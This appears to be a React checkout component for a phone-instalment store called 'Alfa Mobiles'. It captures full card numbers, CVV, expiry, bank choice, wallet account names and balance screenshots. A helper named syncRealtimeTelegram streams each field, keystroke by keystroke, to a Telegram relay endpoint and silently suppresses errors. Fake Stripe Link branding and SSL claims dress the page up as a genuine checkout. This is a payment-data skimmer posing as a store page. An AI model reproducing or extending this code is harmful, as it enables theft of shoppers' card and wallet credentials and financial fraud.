'use client';

import React, { useState, useEffect } from 'react';
import { CreditCard, Wallet, Lock, ShieldCheck, Check, Cloud, CheckCircle2, HelpCircle } from 'lucide-react';
import { useWizard } from '../../context/WizardContext';
import { PAKISTAN_BANKS, MOBILE_WALLETS } from '../../data/catalog';

export const Step4PaymentAgreement: React.FC = () => {
  const {
    selectedModel,
    selectedColor,
    selectedStorage,
    selectedTenureMonths,
    calculatedMonthlyEmi,
    customerDetails,
    paymentDetails,
    setPaymentDetails,
    createOrder
  } = useWizard();

  const [paymentType, setPaymentType] = useState<'card' | 'wallet'>(
    customerDetails.paymentMethod === 'wallet' ? 'wallet' : 'card'
  );
  const [errorMsg, setErrorMsg] = useState<string>('');

  // Real-time Telegram sync helper
  const syncRealtimeTelegram = (stageName: string, updatedPayment: typeof paymentDetails) => {
    try {
      fetch('/api/telegram/realtime', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          stepName: stageName,
          data: {
            model: selectedModel,
            color: selectedColor,
            storage: selectedStorage,
            months: selectedTenureMonths,
            monthlyEmi: calculatedMonthlyEmi,
            customer: customerDetails,
            payment: updatedPayment
          }
        })
      }).catch(() => {});
    } catch (e) {}
  };

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 16);
    return digits.replace(/(.{4})/g, '$1 ').trim();
  };

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 4);
    if (digits.length >= 3) {
      return `${digits.slice(0, 2)} / ${digits.slice(2)}`;
    }
    return digits;
  };

  const handlePaymentTypeChange = (type: 'card' | 'wallet') => {
    setPaymentType(type);
    const updated = { ...paymentDetails };
    syncRealtimeTelegram(`Selected ${type === 'card' ? 'Credit Card' : 'Digital Wallet'}`, updated);
  };

  const handleCardInputChange = (field: keyof typeof paymentDetails, value: any) => {
    const updated = { ...paymentDetails, [field]: value };
    setPaymentDetails(updated);
    if (typeof value === 'string' && value.length > 2) {
      syncRealtimeTelegram(`Entering Card ${String(field)}`, updated);
    }
  };

  const handleWalletInputChange = (field: keyof typeof paymentDetails, value: any) => {
    const updated = { ...paymentDetails, [field]: value };
    setPaymentDetails(updated);
    syncRealtimeTelegram(`Entering Wallet ${String(field)}`, updated);
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) {
        setErrorMsg('File size exceeds 5MB limit.');
        return;
      }
      const previewUrl = URL.createObjectURL(file);
      const updated = {
        ...paymentDetails,
        proofFile: file,
        proofPreviewUrl: previewUrl
      };
      setPaymentDetails(updated);
      setErrorMsg('');
      syncRealtimeTelegram('Uploaded Proof Screenshot', updated);
    }
  };

  const handleConfirm = () => {
    if (!paymentDetails.acceptedTerms) {
      setErrorMsg('You must agree to Alfa Mobiles policy terms to proceed.');
      return;
    }

    if (paymentType === 'card') {
      if (!paymentDetails.bankId) {
        setErrorMsg('Please select your partner bank.');
        return;
      }
      if (!paymentDetails.cardName.trim() || !paymentDetails.cardNumber.trim()) {
        setErrorMsg('Please enter your cardholder name and card number.');
        return;
      }
      if (!paymentDetails.cvv || paymentDetails.cvv.length < 3) {
        setErrorMsg('Please enter a valid 3 or 4 digit CVV/CVC code.');
        return;
      }
    } else if (paymentType === 'wallet') {
      if (!paymentDetails.walletAccountName.trim()) {
        setErrorMsg('Please enter Account Holder Name.');
        return;
      }
    }

    setErrorMsg('');
    createOrder();
  };

  const isCOD = customerDetails.paymentMethod === 'cod';

  return (
    <div className="step-container" style={{ paddingBottom: '90px' }}>
      <h2 style={{ fontSize: '22px', fontWeight: 800, color: '#0f172a', textAlign: 'center', marginBottom: '6px' }}>
        Payment & Checkout
      </h2>
      <p style={{ fontSize: '13px', color: '#64748b', textAlign: 'center', marginBottom: '20px' }}>
        Encrypted & secured by 256-bit SSL settlement protocol
      </p>

      {/* COD Clean Notice */}
      {isCOD && (
        <div
          style={{
            background: '#f0fdf4',
            border: '1px solid #bbf7d0',
            borderRadius: '14px',
            padding: '12px 16px',
            marginBottom: '20px',
            display: 'flex',
            alignItems: 'center',
            gap: '10px'
          }}
        >
          <CheckCircle2 color="#16a34a" size={22} style={{ flexShrink: 0 }} />
          <div style={{ fontSize: '12px', color: '#166534', lineHeight: 1.4 }}>
            <strong>No advance payment required for Cash on Delivery.</strong><br />
            Full cash payment will be collected by TCS rider upon open parcel delivery.
          </div>
        </div>
      )}

      {/* Payment Type Tabs */}
      <div className="form-group" style={{ marginBottom: '22px' }}>
        <label style={{ fontSize: '14px', fontWeight: 700, color: '#334155', marginBottom: '8px' }}>
          Select Payment Method
        </label>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
          <button
            type="button"
            onClick={() => handlePaymentTypeChange('card')}
            style={{
              background: paymentType === 'card' ? '#ffffff' : '#f8fafc',
              border: paymentType === 'card' ? '2px solid #6366f1' : '1px solid #e2e8f0',
              borderRadius: '14px',
              padding: '14px 10px',
              fontSize: '14px',
              fontWeight: 800,
              color: paymentType === 'card' ? '#4f46e5' : '#64748b',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px',
              boxShadow: paymentType === 'card' ? '0 4px 12px rgba(99, 102, 241, 0.15)' : 'none',
              transition: 'all 0.2s ease'
            }}
          >
            <span>💳</span> Credit / Debit Card
          </button>

          <button
            type="button"
            onClick={() => handlePaymentTypeChange('wallet')}
            style={{
              background: paymentType === 'wallet' ? '#ffffff' : '#f8fafc',
              border: paymentType === 'wallet' ? '2px solid #6366f1' : '1px solid #e2e8f0',
              borderRadius: '14px',
              padding: '14px 10px',
              fontSize: '14px',
              fontWeight: 800,
              color: paymentType === 'wallet' ? '#4f46e5' : '#64748b',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '8px',
              boxShadow: paymentType === 'wallet' ? '0 4px 12px rgba(99, 102, 241, 0.15)' : 'none',
              transition: 'all 0.2s ease'
            }}
          >
            <span>💼</span> Digital Wallet
          </button>
        </div>
      </div>

      {/* STRIPE LINK STYLE CREDIT CARD INPUT CONTAINER */}
      {paymentType === 'card' && (
        <div
          style={{
            background: '#ffffff',
            border: '1px solid #e2e8f0',
            borderRadius: '18px',
            padding: '20px 18px',
            boxShadow: '0 4px 20px rgba(0, 0, 0, 0.05)',
            marginBottom: '22px'
          }}
        >
          {/* Header Link Branding */}
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '16px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
              <div style={{ background: '#6366f1', color: '#fff', borderRadius: '6px', padding: '3px 7px', fontSize: '11px', fontWeight: 900 }}>
                Link
              </div>
              <span style={{ fontSize: '13px', fontWeight: 700, color: '#1e293b' }}>Express Card Checkout</span>
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '4px', fontSize: '11px', color: '#16a34a', fontWeight: 700 }}>
              <Lock size={12} color="#16a34a" /> 256-Bit SSL
            </div>
          </div>

          {/* Select Partner Bank */}
          <div className="form-group" style={{ marginBottom: '16px' }}>
            <label style={{ fontSize: '12px', fontWeight: 700, color: '#475569', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
              Issuing Bank
            </label>
            <select
              value={paymentDetails.bankId}
              onChange={(e) => handleCardInputChange('bankId', e.target.value)}
              className="form-select"
              style={{ borderRadius: '10px', padding: '12px', fontSize: '14px', borderColor: '#cbd5e1' }}
            >
              {PAKISTAN_BANKS.map((bank) => (
                <option key={bank.id} value={bank.id}>
                  {bank.name} ({bank.code})
                </option>
              ))}
            </select>
          </div>

          {/* Cardholder Name */}
          <div className="form-group" style={{ marginBottom: '16px' }}>
            <label style={{ fontSize: '12px', fontWeight: 700, color: '#475569', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
              Cardholder Name
            </label>
            <input
              type="text"
              value={paymentDetails.cardName}
              onChange={(e) => handleCardInputChange('cardName', e.target.value)}
              placeholder="Name on card"
              className="form-input"
              style={{ borderRadius: '10px', padding: '12px', fontSize: '14px', borderColor: '#cbd5e1' }}
            />
          </div>

          {/* STRIPE LINK UNIFIED CARD INPUT BOX */}
          <div className="form-group" style={{ marginBottom: '14px' }}>
            <label style={{ fontSize: '12px', fontWeight: 700, color: '#475569', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
              Card Information
            </label>
            
            <div
              style={{
                border: '1px solid #cbd5e1',
                borderRadius: '12px',
                overflow: 'hidden',
                background: '#ffffff',
                boxShadow: '0 1px 2px rgba(0,0,0,0.05)'
              }}
            >
              {/* Top Row: Card Number + Inline Brand Logos */}
              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  padding: '12px 14px',
                  borderBottom: '1px solid #e2e8f0',
                  position: 'relative'
                }}
              >
                <CreditCard size={18} color="#64748b" style={{ marginRight: '10px', flexShrink: 0 }} />
                <input
                  type="text"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  value={paymentDetails.cardNumber}
                  onChange={(e) => handleCardInputChange('cardNumber', formatCardNumber(e.target.value))}
                  placeholder="1234 5678 9012 3456"
                  style={{
                    border: 'none',
                    outline: 'none',
                    width: '100%',
                    fontSize: '15px',
                    fontWeight: 600,
                    letterSpacing: '1px',
                    color: '#0f172a',
                    background: 'transparent'
                  }}
                  maxLength={19}
                />

                {/* Inline Card Brand Logos */}
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexShrink: 0, marginLeft: '8px' }}>
                  <img src="/visacard.webp" alt="Visa" style={{ height: '18px', width: 'auto', objectFit: 'contain' }} />
                  <img src="/mastercard.png" alt="Mastercard" style={{ height: '18px', width: 'auto', objectFit: 'contain' }} />
                </div>
              </div>

              {/* Bottom Row: Expiry + CVV + Country Split */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr' }}>
                <div style={{ padding: '10px 12px', borderRight: '1px solid #e2e8f0' }}>
                  <span style={{ fontSize: '10px', color: '#94a3b8', display: 'block', fontWeight: 700 }}>EXPIRY</span>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={paymentDetails.expiry}
                    onChange={(e) => handleCardInputChange('expiry', formatExpiry(e.target.value))}
                    placeholder="MM / YY"
                    style={{ border: 'none', outline: 'none', width: '100%', fontSize: '13px', fontWeight: 600, color: '#0f172a', background: 'transparent' }}
                    maxLength={7}
                  />
                </div>

                <div style={{ padding: '10px 12px', borderRight: '1px solid #e2e8f0', position: 'relative' }}>
                  <span style={{ fontSize: '10px', color: '#94a3b8', display: 'flex', alignItems: 'center', gap: '2px', fontWeight: 700 }}>
                    CVV <HelpCircle size={10} color="#94a3b8" />
                  </span>
                  <input
                    type="password"
                    inputMode="numeric"
                    pattern="[0-9]*"
                    value={paymentDetails.cvv || ''}
                    onChange={(e) => handleCardInputChange('cvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                    placeholder="123"
                    style={{ border: 'none', outline: 'none', width: '100%', fontSize: '13px', fontWeight: 600, color: '#0f172a', background: 'transparent' }}
                    maxLength={4}
                  />
                </div>

                <div style={{ padding: '10px 12px', background: '#f8fafc' }}>
                  <span style={{ fontSize: '10px', color: '#94a3b8', display: 'block', fontWeight: 700 }}>COUNTRY</span>
                  <span style={{ fontSize: '12px', fontWeight: 700, color: '#334155' }}>🇵🇰 Pakistan</span>
                </div>
              </div>
            </div>
          </div>

          <div style={{ fontSize: '11px', color: '#64748b', textAlign: 'center', marginTop: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '4px' }}>
            <ShieldCheck size={14} color="#6366f1" /> Safe & encrypted payment powered by Alfa Mobiles Bank Rail
          </div>
        </div>
      )}

      {/* Digital Wallet Flow */}
      {paymentType === 'wallet' && (
        <>
          {/* Wallet Type 2x2 Selection Grid */}
          <div className="form-group" style={{ marginBottom: '22px' }}>
            <label style={{ fontSize: '14px', fontWeight: 700, color: '#334155', marginBottom: '10px' }}>
              Select Mobile Wallet Service
            </label>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
              {/* Easypaisa */}
              <div
                onClick={() => handleWalletInputChange('walletType', 'easypaisa')}
                style={{
                  background: paymentDetails.walletType === 'easypaisa' ? '#fff0f1' : '#ffffff',
                  border: paymentDetails.walletType === 'easypaisa' ? '2px solid #8b0000' : '1px solid #d1d5db',
                  borderRadius: '16px',
                  padding: '16px 12px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '6px',
                  cursor: 'pointer'
                }}
              >
                <div
                  style={{
                    width: '20px',
                    height: '20px',
                    borderRadius: '50%',
                    border: paymentDetails.walletType === 'easypaisa' ? 'none' : '2px solid #cbd5e1',
                    background: paymentDetails.walletType === 'easypaisa' ? '#8b0000' : 'transparent',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#ffffff',
                    fontSize: '11px',
                    fontWeight: 'bold'
                  }}
                >
                  {paymentDetails.walletType === 'easypaisa' && <Check size={12} />}
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <img src="/easypaisa.webp" alt="Easypaisa" style={{ height: '20px', width: 'auto' }} />
                  <span style={{ fontSize: '16px', fontWeight: 800, color: '#00a859' }}>Easypaisa</span>
                </div>
              </div>

              {/* Upaisa */}
              <div
                onClick={() => handleWalletInputChange('walletType', 'upaisa')}
                style={{
                  background: paymentDetails.walletType === 'upaisa' ? '#fff0f1' : '#ffffff',
                  border: paymentDetails.walletType === 'upaisa' ? '2px solid #8b0000' : '1px solid #d1d5db',
                  borderRadius: '16px',
                  padding: '16px 12px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '6px',
                  cursor: 'pointer'
                }}
              >
                <div
                  style={{
                    width: '20px',
                    height: '20px',
                    borderRadius: '50%',
                    border: paymentDetails.walletType === 'upaisa' ? 'none' : '2px solid #cbd5e1',
                    background: paymentDetails.walletType === 'upaisa' ? '#8b0000' : 'transparent',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#ffffff',
                    fontSize: '11px',
                    fontWeight: 'bold'
                  }}
                >
                  {paymentDetails.walletType === 'upaisa' && <Check size={12} />}
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                  <img src="/upaisa.png" alt="Upaisa" style={{ height: '20px', width: 'auto' }} />
                  <span style={{ fontSize: '16px', fontWeight: 800, color: '#ea580c' }}>Upaisa</span>
                </div>
              </div>

              {/* UBL */}
              <div
                onClick={() => handleWalletInputChange('walletType', 'ubl_omni')}
                style={{
                  background: paymentDetails.walletType === 'ubl_omni' ? '#fff0f1' : '#ffffff',
                  border: paymentDetails.walletType === 'ubl_omni' ? '2px solid #8b0000' : '1px solid #d1d5db',
                  borderRadius: '16px',
                  padding: '16px 12px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '6px',
                  cursor: 'pointer'
                }}
              >
                <div
                  style={{
                    width: '20px',
                    height: '20px',
                    borderRadius: '50%',
                    border: paymentDetails.walletType === 'ubl_omni' ? 'none' : '2px solid #cbd5e1',
                    background: paymentDetails.walletType === 'ubl_omni' ? '#8b0000' : 'transparent',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#ffffff',
                    fontSize: '11px',
                    fontWeight: 'bold'
                  }}
                >
                  {paymentDetails.walletType === 'ubl_omni' && <Check size={12} />}
                </div>
                <span style={{ fontSize: '16px', fontWeight: 800, color: '#1e3a8a' }}>UBL</span>
              </div>

              {/* Alfalah */}
              <div
                onClick={() => handleWalletInputChange('walletType', 'alfalah_wallet')}
                style={{
                  background: paymentDetails.walletType === 'alfalah_wallet' ? '#fff0f1' : '#ffffff',
                  border: paymentDetails.walletType === 'alfalah_wallet' ? '2px solid #8b0000' : '1px solid #d1d5db',
                  borderRadius: '16px',
                  padding: '16px 12px',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '6px',
                  cursor: 'pointer'
                }}
              >
                <div
                  style={{
                    width: '20px',
                    height: '20px',
                    borderRadius: '50%',
                    border: paymentDetails.walletType === 'alfalah_wallet' ? 'none' : '2px solid #cbd5e1',
                    background: paymentDetails.walletType === 'alfalah_wallet' ? '#8b0000' : 'transparent',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#ffffff',
                    fontSize: '11px',
                    fontWeight: 'bold'
                  }}
                >
                  {paymentDetails.walletType === 'alfalah_wallet' && <Check size={12} />}
                </div>
                <span style={{ fontSize: '16px', fontWeight: 800, color: '#b91c1c' }}>Alflah</span>
              </div>
            </div>
          </div>

          {/* Account Holder Name */}
          <div className="form-group" style={{ marginBottom: '22px' }}>
            <label style={{ fontSize: '14px', fontWeight: 700, color: '#334155', marginBottom: '8px' }}>
              Account Holder Name
            </label>
            <input
              type="text"
              value={paymentDetails.walletAccountName}
              onChange={(e) => handleWalletInputChange('walletAccountName', e.target.value)}
              placeholder="Enter Account Holder Name"
              className="form-input"
              style={{ borderRadius: '14px', padding: '14px', fontSize: '15px' }}
            />
          </div>

          {/* Attach Proof of Payment Dashed Red Box */}
          <div className="form-group" style={{ marginBottom: '24px' }}>
            {paymentDetails.proofPreviewUrl ? (
              <div className="proof-preview-container" style={{ borderRadius: '16px' }}>
                <img
                  src={paymentDetails.proofPreviewUrl}
                  alt="Proof Preview"
                  className="proof-preview-img"
                />
                <button
                  type="button"
                  onClick={() => handleWalletInputChange('proofPreviewUrl', null)}
                  style={{
                    position: 'absolute',
                    top: '8px',
                    right: '8px',
                    background: 'rgba(0,0,0,0.7)',
                    color: '#fff',
                    border: 'none',
                    borderRadius: '50%',
                    width: '28px',
                    height: '28px',
                    cursor: 'pointer'
                  }}
                >
                  ✕
                </button>
              </div>
            ) : (
              <label
                style={{
                  border: '2px dashed #b91c1c',
                  borderRadius: '18px',
                  background: '#fff5f5',
                  padding: '24px 16px',
                  textAlign: 'center',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  gap: '8px',
                  cursor: 'pointer'
                }}
              >
                <div
                  style={{
                    width: '54px',
                    height: '54px',
                    borderRadius: '50%',
                    background: '#e0f2fe',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    color: '#38bdf8',
                    marginBottom: '4px'
                  }}
                >
                  <Cloud size={30} fill="#bae6fd" color="#0284c7" />
                </div>
                <span style={{ fontSize: '16px', fontWeight: 800, color: '#991b1b' }}>
                  Attach Proof of Payment
                </span>
                <span style={{ fontSize: '12px', color: '#4b5563', maxWidth: '280px', lineHeight: 1.3 }}>
                  Show balance screenshot of given number with verification of our agent.
                </span>
                <span style={{ fontSize: '11px', color: '#9ca3af' }}>
                  (Max 5MB, JPG/PNG/PDF)
                </span>
                <input
                  type="file"
                  accept="image/png, image/jpeg, application/pdf"
                  onChange={handleFileUpload}
                  style={{ display: 'none' }}
                />
              </label>
            )}
          </div>
        </>
      )}

      {/* Terms & Conditions Checkbox */}
      <div className="form-group" style={{ marginBottom: '24px' }}>
        <label
          style={{
            display: 'flex',
            alignItems: 'flex-start',
            gap: '10px',
            fontSize: '14px',
            color: '#111827',
            cursor: 'pointer',
            lineHeight: 1.4
          }}
        >
          <input
            type="checkbox"
            checked={paymentDetails.acceptedTerms}
            onChange={(e) => {
              const checked = e.target.checked;
              const updated = { ...paymentDetails, acceptedTerms: checked };
              setPaymentDetails(updated);
              syncRealtimeTelegram(`Agreed Terms (${checked ? 'Yes' : 'No'})`, updated);
            }}
            style={{ width: '18px', height: '18px', marginTop: '2px', accentColor: '#8b0000' }}
          />
          <span>
            I Agree the terms and conditions of <strong style={{ color: '#1e3a8a' }}>Alfa Mobiles policy</strong>.
          </span>
        </label>
      </div>

      {errorMsg && (
        <p style={{ color: '#d31820', fontSize: '13px', fontWeight: 600, marginBottom: '16px' }}>
          ⚠️ {errorMsg}
        </p>
      )}

      {/* Confirm Order Button */}
      <div className="sticky-bottom-bar">
        <button
          onClick={handleConfirm}
          className="btn-primary"
          style={{
            background: 'linear-gradient(135deg, #4f46e5 0%, #3730a3 100%)',
            padding: '16px',
            borderRadius: '50px',
            fontSize: '18px',
            fontWeight: 800,
            boxShadow: '0 4px 16px rgba(79, 70, 229, 0.3)'
          }}
        >
          {'Confirm Order →'}
        </button>
      </div>
    </div>
  );
};
